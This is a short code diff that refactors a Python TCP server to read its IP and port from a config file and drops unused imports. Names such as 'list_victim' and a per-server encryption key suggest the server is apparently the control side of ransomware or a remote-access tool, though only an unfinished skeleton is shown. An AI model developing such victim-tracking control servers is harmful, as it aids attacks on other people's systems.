@@ -12,11 +12,9 @@
 # --------------------------------------------
 import socket
 import threading
-import time
-
+import configgetter as config
 import security
 import os
-import binascii
 import utile.data as udata
 
 
@@ -29,7 +27,6 @@ class server_tcp(object):
         self.ip = ip
         self.port = port
         self.encryptkey = os.urandom(32)
-
 
     def start_server(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -55,8 +52,6 @@ class server_tcp(object):
                 # @Todo: Build header & send it before msg
                 self.conn.send(bytes(rs, 'utf-8'))
 
-
-
     def gestion_msg(self, message):
         if message == b'1':
             return udata.list_victim()
@@ -68,5 +63,5 @@ class server_tcp(object):
             return "Todo3"
 
 
-srv = server_tcp("", 8382)
+srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
 srv.start_server()
